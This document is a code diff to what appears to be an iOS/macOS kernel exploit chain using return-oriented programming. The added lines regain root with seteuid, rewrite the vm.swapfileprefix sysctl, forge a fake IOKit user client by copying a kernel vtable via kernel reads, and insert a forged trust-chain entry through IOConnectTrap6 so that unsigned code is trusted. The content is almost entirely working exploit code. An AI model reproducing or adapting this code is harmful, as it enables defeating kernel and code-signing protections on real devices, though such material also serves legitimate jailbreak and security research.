@@ -654,6 +654,8 @@ void stage2(offset_struct_t * offsets,char * base_dir) {
 
 #if 0
 
+	CALL("seteuid",501,0,0,0,0,0,0,0); 
+	CALL("seteuid",0,0,0,0,0,0,0,0); 
 
 	DEFINE_ROP_VAR("swapprefix_buffer",1024,&buf);
 	DEFINE_ROP_VAR("swapprefix_length",sizeof(uint64_t),&buf);
@@ -672,6 +674,10 @@ void stage2(offset_struct_t * offsets,char * base_dir) {
 	ROP_VAR_ARG("swapprefix_buffer",3);
 	ROP_VAR_ARG("swapprefix_length",4);
 	CALL("sysctl",0,oidlen/4,0,0,0,0,0,0);
+	ROP_VAR_ARG_HOW_MANY(2);
+	ROP_VAR_ARG("swapprefix_oid",1);
+	ROP_VAR_ARG("swapprefix_buffer",5);
+	CALL("sysctl",0,oidlen/4,0,0,100,0,0,0);
 
 
 
@@ -1166,6 +1172,8 @@ _STRUCT_ARM_THREAD_STATE64
 	kr64("bss_trust_chain_head_ptr","bss_trust_chain_head");
 	ROP_VAR_CPY_W_OFFSET("new_trust_chain_entry",offsetof(struct trust_chain,next),"bss_trust_chain_head",0,8);
 
+	CALL("seteuid",0,0,0,0,0,0,0,0); // we need to be root again otherwise we can't set eh swapprefix
+
 	DEFINE_ROP_VAR("swapprefix_buffer",1024,tmp);
 	DEFINE_ROP_VAR("swapprefix_length",sizeof(uint64_t),tmp);
 	// using undocumented magic to get the integer name of vm.swapfileprefix
@@ -1210,8 +1218,19 @@ _STRUCT_ARM_THREAD_STATE64
 
 	// turn the_one into a fake UC port
 	
+	
+	
 	// create a fake UC
-	DEFINE_ROP_VAR("fake_client",200,tmp);
+	DEFINE_ROP_VAR("fake_client",0x100*8,tmp);
+	
+	DEFINE_ROP_VAR("root_domain_ptr",8,tmp);
+	ROP_VAR_CPY("root_domain_ptr","kobj_client",8);
+	for (int i = 0; i < VTAB_SIZE; i++) {
+		kr64("root_domain_ptr","tmp_uint64");
+		ROP_VAR_CPY_W_OFFSET("fake_client",i*8,"tmp_uint64",0,8);
+		SET_ROP_VAR64("tmp_uint64",8);
+		ROP_VAR_ADD("root_domain_ptr","root_domain_ptr","tmp_uint64");
+	}
 	SET_ROP_VAR64_TO_VAR_W_OFFSET("fake_client",0,"UC_VTAB",0);
 
 	// update fakeport as iokit obj
@@ -1244,6 +1263,9 @@ _STRUCT_ARM_THREAD_STATE64
 	ROP_VAR_ARG("new_trust_chain_entry_addr",3);
 	CALL("IOConnectTrap6",0,0,0,8,0,0,0,0);
 	
+	ADD_LOOP_START("sleep");
+		ADD_USLEEP(10000);
+	ADD_LOOP_END();
 
 	// ghetto dlopen
 	// get a file descriptor for that dylib
